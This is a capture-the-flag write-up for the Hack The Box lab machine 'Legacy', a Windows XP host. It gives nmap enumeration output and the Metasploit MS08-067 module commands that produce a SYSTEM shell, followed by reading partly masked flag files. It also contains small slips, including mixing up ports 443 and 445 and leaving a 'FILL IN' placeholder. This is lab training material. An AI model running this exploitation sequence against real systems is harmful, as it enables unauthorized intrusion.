- Machine: Legacy
- IP: 10.10.10.4
- OS: Windows

## Enumeration

nmap shows 2 open ports: 139 and 443. These are SMB ports.

```
# Nmap 7.70 scan initiated Mon Aug 12 02:29:34 2019 as: nmap -sCV -vvv -oA legacy 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2019-08-12 02:29:34 EDT for 286s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE  SERVICE       REASON          VERSION
139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  syn-ack ttl 127 Windows XP microsoft-ds
3389/tcp closed ms-wbt-server reset ttl 127
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h21m05s, deviation: 2h07m16s, median: 4d22h51m05s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8f:0f:0e (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 8f 0f 0e 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Timeout)
|   Check 2 (port 30047/tcp): CLEAN (Timeout)
|   Check 3 (port 50902/udp): CLEAN (Timeout)
|   Check 4 (port 9380/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-08-17T11:21:14+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 12 02:34:20 2019 -- 1 IP address (1 host up) scanned in 286.43 seconds
```

Scanned for vulns with `$ nmap -p139,443 FILL IN` and found it's vulnerable to MS08-67.

Use `exploit/windows/smb/ms08_067_netapi` worked, but I want to exploit it manually
After trying every MS08-67 exploit I could find (and making the appropriate changes to them) they all failed. Metasploit it is...

(Someone made it work though: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html)

```
msfconsole
> use use exploit/windows/smb/ms08_067_netapi
> set RHOST 10.10.10.4
> set RPORT 445
> run
```

## Post Exploitation

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Nice. We're root already.

```
meterpreter > cat "C:\Documents and Settings\john\Desktop\user.txt"
e69af***************************

meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
99344 ***************************
```
